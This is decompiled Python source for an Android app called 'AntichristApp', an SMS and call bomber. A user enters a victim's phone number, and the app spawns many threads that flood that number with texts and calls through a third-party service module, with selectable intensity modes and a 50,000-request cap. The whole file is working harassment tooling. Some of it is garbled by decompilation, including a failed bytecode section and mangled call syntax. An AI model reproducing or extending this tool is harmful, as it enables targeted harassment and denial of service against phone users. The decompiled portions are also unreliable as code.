# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: /root/chat/APK/.buildozer/android/app/main.py
# Compiled at: 2021-01-03 11:14:28
# Size of source mod 2**32: 14812 bytes
import kivymd.toast as toast
from kivymd.app import MDApp
from kivy.lang import Builder
from kivy.animation import Animation
from kivy.core.window import Window
from kivy.core.clipboard import Clipboard
from kivymd.utils.fitimage import FitImage
import kivy.utils
from StructService import Distribution_Service
import threading, webbrowser, random, requests, time, re, os
Window.keyboard_anim_args = {'d':0.2,  't':'in_out_expo'}
Window.softinput_mode = 'below_target'
attack_number_phone = Distribution_Service()

def ads--- This code section failed: ---

 L.  17         0  SETUP_FINALLY        60  'to 60'

 L.  18         2  LOAD_GLOBAL              requests
                4  LOAD_METHOD              get
                6  LOAD_FAST                'target'
                8  CALL_METHOD_1         1  ''
               10  STORE_FAST               'ads_channel'

 L.  19        12  LOAD_FAST                'ads_channel'
               14  LOAD_ATTR                content
               16  LOAD_METHOD              decode
               18  LOAD_STR                 'UTF-8'
               20  CALL_METHOD_1         1  ''
               22  STORE_FAST               'content'

 L.  20        24  LOAD_FAST                'content'
               26  LOAD_CONST               230
               28  LOAD_CONST               280
               30  BUILD_SLICE_2         2 
               32  BINARY_SUBSCR    
               34  STORE_FAST               'result_text_ads'

 L.  21        36  LOAD_FAST                'result_text_ads'
               38  LOAD_CONST               None
               40  LOAD_FAST                'result_text_ads'
               42  LOAD_METHOD              rfind
               44  LOAD_STR                 '*'
               46  CALL_METHOD_1         1  ''
               48  BUILD_SLICE_2         2 
               50  BINARY_SUBSCR    
               52  STORE_FAST               'result_text_ads'

 L.  22        54  LOAD_FAST                'result_text_ads'
               56  POP_BLOCK        
               58  RETURN_VALUE     
             60_0  COME_FROM_FINALLY     0  '0'

 L.  23        60  DUP_TOP          
               62  LOAD_GLOBAL              Exception
               64  COMPARE_OP               exception-match
               66  POP_JUMP_IF_FALSE    80  'to 80'
               68  POP_TOP          
               70  POP_TOP          
               72  POP_TOP          

 L.  24        74  POP_EXCEPT       
               76  LOAD_STR                 't.me/antichristone'
               78  RETURN_VALUE     
             80_0  COME_FROM            66  '66'
               80  END_FINALLY      

Parse error at or near `POP_TOP' instruction at offset 70


def send_call():
    try:
        attack_number_phone.call_next_service()
    except Exception:
        pass


def send_message(only_sms=None):
    if only_sms == None:
        try:
            attack_number_phone.random_service()
        except Exception:
            pass

    else:
        if only_sms == True:
            try:
                attack_number_phone.sms_random_service()
            except Exception:
                pass


def send_message_next(only_sms=None):
    if only_sms == None:
        try:
            attack_number_phone.next_service()
        except Exception:
            pass

    else:
        if only_sms == True:
            try:
                attack_number_phone.sms_next_service()
            except Exception:
                pass


class AntichristApp(MDApp):

    def __init__(self, **kwargs):
        (super().__init__)(**kwargs)
        self.screen = Builder.load_file'style.kv'
        self.status = None
        self.flag = None
        self.mode = 'Ultra'
        self.what = 'Mix'
        self.attack_number_phone = attack_number_phone
        self.label = self.screen.ids.label
        self.links = self.screen.ids.link_tg
        self.open = 'https://t.me/antichristone'
        self.link_th = threading.Thread(target=(self.start_link), args=(10, ))
        self.link_th.start()

    def link(self):
        webbrowser.openself.open

    def start_link(self, timer):
        time.sleeptimer
        while True:
            new_text = ads()
            self.open = 'http://' + new_text[new_text.rfind':' + 2:]
            time.sleep6
            Animation(center_y_1=(-2), duration=2).startself.links
            self.links.text = '[color=#fdb3ff]' + str(new_text) + '[/color]'
            time.sleep9
            Animation(center_y_1=0.2, duration=2).startself.links

    def bufer(self, bufer=None, widget=None):
        if bufer == True:
            paste = Clipboard.paste()
            phone = ''
            for xxx in re.findall('[0-9]+', paste):
                phone += xxx
            else:
                phone = '+' + phone
                try:
                    if isinstance(int(phone[1:]), int):
                        if widget.text == '':
                            widget.text = phone
                except Exception:
                    pass

        else:
            try:
                if isinstance(int(phone[1:]), int):
                    return phone
            except Exception:
                return ''

    def label_threading(self, timer):
        time.sleeptimer
        toast('clear')
        self.label.text = ' '

    def modes(self, mode_widget=None):
        if mode_widget.text == 'Ultra':
            toast('Mode: Light')
            mode_widget.text = 'Light'
            self.mode = 'Light'
        else:
            if mode_widget.text == 'Light':
                toast('Mode: Hard')
                mode_widget.text = 'Hard'
                self.mode = 'Hard'
            else:
                if mode_widget.text == 'Hard':
                    toast('Mode: Ultra')
                    mode_widget.text = 'Ultra'
                    self.mode = 'Ultra'

    def whats(self, what_widget=None):
        if what_widget.text == 'Mix':
            toast('Only Call')
            what_widget.text = 'Call'
            self.what = 'Call'
        else:
            if what_widget.text == 'Call':
                toast('Only SMS')
                what_widget.text = 'SMS'
                self.what = 'SMS'
            else:
                if what_widget.text == 'SMS':
                    toast('All inclusive')
                    what_widget.text = 'Mix'
                    self.what = 'Mix'

    def threding_attack_ultra(self):
        x_count = 0
        if self.what == 'Mix':
            while self.status:
                try:
                    x_count += 1
                    self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                    threading.Thread(target=send_message).start()
                    threading.Thread(target=send_message).start()
                    threading.Thread(target=send_message).start()
                    threading.Thread(target=send_message).start()
                    threading.Thread(target=send_message_next).start()
                    x_count += 4
                    self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                    if x_count > 50000:
                        toast('Stop spam-attack!')
                        self.button_attack_cancel.text = 'Attack'
                        self.status = False
                        threading.Thread(target=(self.label_threading), args=(10, )).start()
                        self.button_attack_cancel.text = 'Attack'
                except Exception:
                    self.label.text = '[color=#fdb3ff]ERROR[/color]'

        else:
            if self.what == 'Call':
                while True:
                    if self.status:
                        try:
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            threading.Thread(target=send_call).start()
                            x_count += 1
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            time.sleep0.2
                            if x_count > 50000:
                                toast('Stop spam-attack!')
                                self.button_attack_cancel.text = 'Attack'
                                self.status = False
                                threading.Thread(target=(self.label_threading), args=(10, )).start()
                                self.button_attack_cancel.text = 'Attack'
                        except Exception:
                            self.label.text = '[color=#fdb3ff]ERROR[/color]'

            else:
                if self.what == 'SMS':
                    while self.status:
                        try:
                            x_count += 1
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            threading.Thread(target=send_message, args=(True, )).start()
                            threading.Thread(target=send_message, args=(True, )).start()
                            threading.Thread(target=send_message, args=(True, )).start()
                            threading.Thread(target=send_message, args=(True, )).start()
                            threading.Thread(target=send_message_next, args=(True, )).start()
                            x_count += 4
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            if x_count > 50000:
                                toast('Stop spam-attack!')
                                self.button_attack_cancel.text = 'Attack'
                                self.status = False
                                threading.Thread(target=(self.label_threading), args=(10, )).start()
                                self.button_attack_cancel.text = 'Attack'
                        except Exception:
                            self.label.text = '[color=#fdb3ff]ERROR[/color]'

    def threding_attack_hard(self):
        x_count = 0
        if self.what == 'Mix':
            while self.status:
                try:
                    self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                    threading.Thread(target=send_message).start()
                    threading.Thread(target=send_message).start()
                    x_count += 2
                    self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                    if x_count > 50000:
                        toast('Stop spam-attack!')
                        self.button_attack_cancel.text = 'Attack'
                        self.status = False
                        threading.Thread(target=(self.label_threading), args=(10, )).start()
                        self.button_attack_cancel.text = 'Attack'
                except Exception as e:
                    try:
                        self.label.text = '[color=#fdb3ff]ERROR[/color]'
                    finally:
                        e = None
                        del e

        else:
            if self.what == 'Call':
                while True:
                    if self.status:
                        try:
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            threading.Thread(target=send_call).start()
                            x_count += 1
                            time.sleep0.3
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            if x_count > 50000:
                                toast('Stop spam-attack!')
                                self.button_attack_cancel.text = 'Attack'
                                self.status = False
                                threading.Thread(target=(self.label_threading), args=(10, )).start()
                                self.button_attack_cancel.text = 'Attack'
                        except Exception as e:
                            try:
                                self.label.text = '[color=#fdb3ff]ERROR[/color]'
                            finally:
                                e = None
                                del e

            else:
                if self.what == 'SMS':
                    while self.status:
                        try:
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            threading.Thread(target=send_message, args=(True, )).start()
                            threading.Thread(target=send_message, args=(True, )).start()
                            x_count += 2
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            if x_count > 50000:
                                toast('Stop spam-attack!')
                                self.button_attack_cancel.text = 'Attack'
                                self.status = False
                                threading.Thread(target=(self.label_threading), args=(10, )).start()
                                self.button_attack_cancel.text = 'Attack'
                        except Exception as e:
                            try:
                                self.label.text = '[color=#fdb3ff]ERROR[/color]'
                            finally:
                                e = None
                                del e

    def threding_attack_light(self):
        x_count = 0
        if self.what == 'Mix':
            while self.status:
                try:
                    self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                    threading.Thread(target=send_message_next).start()
                    time.sleep0.6
                    x_count += 1
                    self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                    time.sleep0.9
                    if x_count > 50000:
                        toast('Stop spam-attack!')
                        self.button_attack_cancel.text = 'Attack'
                        self.status = False
                        threading.Thread(target=(self.label_threading), args=(10, )).start()
                        self.button_attack_cancel.text = 'Attack'
                except Exception:
                    self.label.text = '[color=#fdb3ff]ERROR[/color]'

        else:
            if self.what == 'Call':
                while True:
                    if self.status:
                        try:
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            threading.Thread(target=send_call).start()
                            x_count += 1
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            time.sleep1
                            if x_count > 50000:
                                toast('Stop spam-attack!')
                                self.button_attack_cancel.text = 'Attack'
                                self.status = False
                                threading.Thread(target=(self.label_threading), args=(10, )).start()
                                self.button_attack_cancel.text = 'Attack'
                        except Exception:
                            self.label.text = '[color=#fdb3ff]ERROR[/color]'

            else:
                if self.what == 'SMS':
                    while self.status:
                        try:
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            threading.Thread(target=send_message_next, args=(True, )).start()
                            time.sleep0.6
                            x_count += 1
                            self.label.text = f"[color=#fdb3ff]{str(x_count)}[/color]"
                            time.sleep0.9
                            if x_count > 50000:
                                toast('Stop spam-attack!')
                                self.button_attack_cancel.text = 'Attack'
                                self.status = False
                                threading.Thread(target=(self.label_threading), args=(10, )).start()
                                self.button_attack_cancel.text = 'Attack'
                        except Exception:
                            self.label.text = '[color=#fdb3ff]ERROR[/color]'

    def attack(self, attack=None):
        self.button_attack_cancel = self.screen.ids.button_attack_cancel
        if self.button_attack_cancel.text == 'Attack':
            try:
                if isinstance(int(attack.text[1:]), int):
                    toast('Start spam-attack!')
                    if self.mode == 'Ultra':
                        self.button_attack_cancel.text = 'Stop'
                        self.status = True
                        self.target = attack.text
                        self.attack_number_phone.phoneself.target
                        self.thred_z = threading.Thread(target=(self.threding_attack_ultra))
                        self.thred_z.start()
                    else:
                        if self.mode == 'Hard':
                            self.button_attack_cancel.text = 'Stop'
                            self.status = True
                            self.target = attack.text
                            self.attack_number_phone.phoneself.target
                            self.thred_z = threading.Thread(target=(self.threding_attack_hard))
                            self.thred_z.start()
                        else:
                            if self.mode == 'Light':
                                self.button_attack_cancel.text = 'Stop'
                                self.status = True
                                self.target = attack.text
                                self.attack_number_phone.phoneself.target
                                self.thred_z = threading.Thread(target=(self.threding_attack_light))
                                self.thred_z.start()
            except Exception:
                pass

        else:
            if self.button_attack_cancel.text == 'Stop':
                toast('Stop spam-attack!')
                self.button_attack_cancel.text = 'Attack'
                self.status = False
                threading.Thread(target=(self.label_threading), args=(10, )).start()
                self.button_attack_cancel.text = 'Attack'

    def build(self):
        return self.screen


if __name__ == '__main__':
    AntichristApp().run()